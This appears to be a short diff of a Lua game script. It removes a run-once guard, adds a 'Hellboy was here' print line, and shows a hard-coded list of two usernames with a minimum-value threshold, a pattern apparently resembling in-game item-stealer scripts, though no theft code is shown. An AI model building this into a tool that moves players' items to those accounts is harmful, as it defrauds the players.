@@ -1,8 +1,4 @@
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
-_G.scriptExecuted = true
+print("Hellboy was here")
 
 local users = {"Pipiwastaken", "HellboyStorage"}
 local min_value = 0.000001
